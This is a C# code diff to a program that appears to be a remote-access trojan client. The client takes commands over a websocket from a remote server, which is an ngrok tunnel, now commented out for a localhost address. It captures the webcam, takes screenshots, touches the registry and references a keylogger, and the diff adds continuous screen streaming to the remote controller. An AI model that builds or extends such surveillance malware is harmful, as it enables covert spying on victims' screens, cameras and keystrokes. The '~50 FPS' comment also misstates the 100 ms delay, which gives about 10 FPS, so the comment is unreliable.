@@ -24,7 +24,7 @@ class Program
 
     static Webcam webcam = new Webcam();
     static bool webcamRunning = false;
-
+    static bool screenStreaming = false;
 
     //static KeylogController kl = new KeylogController();
 
@@ -32,8 +32,8 @@ class Program
     {
         Console.WriteLine("Starting client...");
 
-        //await ws.ConnectAsync(new Uri("ws://localhost:5000/ws"), CancellationToken.None);
-        await ws.ConnectAsync(new Uri("wss://abigail-conciliable-hyun.ngrok-free.dev/ws/"), CancellationToken.None);
+        await ws.ConnectAsync(new Uri("ws://localhost:5000/ws"), CancellationToken.None);
+        //await ws.ConnectAsync(new Uri("wss://abigail-conciliable-hyun.ngrok-free.dev/ws/"), CancellationToken.None);
     
 
         // REGISTER
@@ -111,6 +111,15 @@ class Program
 
             case "SCREENSHOT-TAKE":
                 sendImage(from, take());
+                break;
+
+            case "SCREENSHOT-STREAM":
+                screenStreaming = true;
+                _ = StreamScreen(from);
+                break;
+
+            case "SCREENSHOT-STOP":
+                screenStreaming = false;
                 break;
 
             case "REGISTRY":
@@ -419,6 +428,21 @@ class Program
             if (frame != null)
             {
                 sendImage(to, frame);
+            }
+
+            await Task.Delay(100); // ~50 FPS
+        }
+    }
+
+    static async Task StreamScreen(string to)
+    {
+        while (screenStreaming)
+        {
+            var screenshot = take();
+
+            if (screenshot != null)
+            {
+                sendImage(to, screenshot);
             }
 
             await Task.Delay(100); // ~50 FPS
